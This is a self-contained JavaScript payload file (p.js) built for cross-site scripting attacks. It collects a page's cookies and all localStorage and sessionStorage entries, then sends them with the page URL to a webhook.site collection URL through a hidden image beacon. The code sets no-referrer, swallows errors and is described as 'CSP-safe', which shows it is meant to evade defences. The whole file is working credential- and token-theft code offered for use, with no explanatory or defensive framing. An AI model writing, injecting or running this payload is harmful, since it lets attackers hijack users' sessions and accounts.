// p.js — cookie/localStorage/sessionStorage exfil via image beacon (CSP-safe)
(function () {
  function send(qkey, qval) {
    try {
      var img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src =
        "https://webhook.site/abc5b1d6-8272-4188-873e-5b98c81ed700" +
        "?u=" + encodeURIComponent(location.href) +
        "&" + encodeURIComponent(qkey) + "=" + encodeURIComponent(String(qval).slice(0,6000));
    } catch (e) {}
  }

  // 1) Cookies (works if NOT HttpOnly)
  try {
    var ck = document.cookie || "";
    if (ck) send("c", ck);
  } catch (e) {}

  // 2) localStorage (sometimes apps stash tokens here)
  try {
    if (window.localStorage && localStorage.length) {
      var ls = [];
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        var v = localStorage.getItem(k);
        ls.push(k + "=" + v);
      }
      if (ls.length) send("ls", ls.join("&"));
    }
  } catch (e) {}

  // 3) sessionStorage (optional)
  try {
    if (window.sessionStorage && sessionStorage.length) {
      var ss = [];
      for (var j = 0; j < sessionStorage.length; j++) {
        var k2 = sessionStorage.key(j);
        var v2 = sessionStorage.getItem(k2);
        ss.push(k2 + "=" + v2);
      }
      if (ss.length) send("ss", ss.join("&"));
    }
  } catch (e) {}
})();
